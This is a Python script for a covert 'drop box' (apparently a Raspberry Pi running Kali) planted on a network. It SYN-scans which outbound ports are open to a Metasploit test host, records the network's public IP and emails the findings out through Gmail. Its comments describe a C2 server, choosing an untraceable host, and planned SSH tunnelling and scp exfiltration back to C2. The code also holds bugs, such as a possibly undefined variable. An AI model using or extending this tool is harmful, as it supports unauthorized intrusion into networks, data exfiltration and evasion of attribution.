import nmap
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from datetime import datetime 
import time
import os
import sys
import requests

def main():
    # C2 will have to be replaced with valid public C2 IP address: 
    c2_ip = '10.0.0.100'
    # Host out on the internet that can't be traced back to you that
    # you know has the list of potentially interesting ports open: 
    test_host = 'egadz.metasploit.com'
    # List of potentially interesting outbound ports to check for: 
    port_list = [22,53,443,465,587,4444,8080]
    scan_time = getTimestamp()
    email_contents = 'The following tcp ports are open outbound for this network to ' + test_host + ': \n\n' 
    for port in port_list:
        port_status = PortChecker(test_host,port)
        email_contents += 'Port ' + str(port) + ' on host ' + test_host + ' is ' + port_status + '\n' 
    # If port 80 is open, connect to ip.42.pl and record public IP:
    if 'open' in PortChecker(test_host,80):  
        public_ip = requests.get('http://ip.42.pl/raw').text
        email_contents += 'HTTP outbound is open and the public IP is ' + public_ip + '\n'
    # If port 22 is open, connect back to C2 for an ssh tunnel:
    if 'open' in PortChecker(test_host,22): 
        email_contents += 'SSH is open outbound to test host, connecting to C2 from ' + public_ip + '\n'
        # TO DO: Add functionality to connect to C2 for ssh tunnel
        # TO DO: Also scp the scan file out in case the drop box is lost
    email_port = 465
    email_server = 'smtp.gmail.com'
    # Write info to /scans in case email ports aren't open outbound:
    filename = '/scans/' + scan_time + '.txt'
    scan_file = open(filename, 'w')
    scan_file.write(email_contents)
    # Check for ports open to gmail. If open send email, otherwise write
    # results to file and terminate program.
    if 'open' in PortChecker(email_server,email_port):    
        sendnotificationmail(email_contents,email_port)
        scan_file.write('\nPort 465 was open, sending scan results to gmail  \n')
        scan_file.close()
        sys.exit()
    # If port 465 isn't open, maybe 587 is:     
    else:
        email_port = 587
        if 'open' in PortChecker(email_server,email_port):
            sendnotificationmail(email_contents,email_port)
            scan_file.write('\nPort 587 was open, sending scan results to gmail \n')
            scan_file.close()
            sys.exit()
        # If no email ports are open outbound write results to file and end:     
        else:
            scan_file.write('\nNo email ports to smtp.gmail.com open, couldn\'t send email \n')
            scan_file.close()
            sys.exit()

# Function for sending email results:        
def sendnotificationmail(email_contents,email_port):
    gmail_user = ''
    gmail_password = ''
    to_email = ''
    # create message object
    msg = MIMEMultipart()
    # fill in all the normal email parts
    msg['Subject'] = "The Kali PI Has Connected to a New Network"
    msg['From'] = gmail_user
    msg['To'] = to_email
    SERVER = "smtp.gmail.com:" + str(email_port)
    # resultsFile = file(scanResults)
    # attachment = MIMEText(resultsFile.read())
    # attachment.add_header('Content-Disposition', 'attachment', filename=scanResults)
    body = email_contents
    msg.attach(MIMEText(body))
    # attach human-readable scan results
    # msg.attach(attachment)
    server = smtplib.SMTP_SSL(SERVER)
    server.ehlo()
    server.login(gmail_user , gmail_password)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()
    
# Function for getting the timestamp:
def getTimestamp():
    day = time.strftime("%Y%m%d_")
    clock = time.strftime("%I%M%S")
    timestamp = day+clock
    return timestamp    

# Function for running a full nmap portscan:   
def PortScannerFull(ip,scantime):
    print 'Starting nmap outbound port scan scan....'
    ls_error = 'cannot'
    if ls_error in os.popen('ls /scans/'):
        os.popen('mkdir -p /scans/')    
    nm = nmap.PortScanner()
    scan_results = nm.scan(str(ip), arguments = '-p 22,53,80,443,465,587 -sS')# '-oN /scans/' + scantime + '-outboundscan.txt')
    print 'Scan complete!'
    return scan_results

# Function for checking individual ports with a syn scan: 
def PortChecker(ip,port):
    print 'Checking port...'
    nm = nmap.PortScanner()
    scan_results = nm.scan(str(ip), arguments = '-sS -p ' + str(port))
    # This iteration is necessary if a hostname is used as the scan target, 
    # since the nmap results will be for whatever IP it resolved to.
    for ip_addy in scan_results['scan']:
        scanned_ip = ip_addy
    # Returns 'open' or 'closed' depending on nmap results: 
    print 'Port check on ' + str(port) + ' complete!'
    if 'open' in scan_results['scan'][scanned_ip]['tcp'][port]['state']:
        port_status = 'open'
        return port_status
    else:
        port_status = 'closed'
        return port_status
    
    
    
if __name__ == "__main__":
    main()
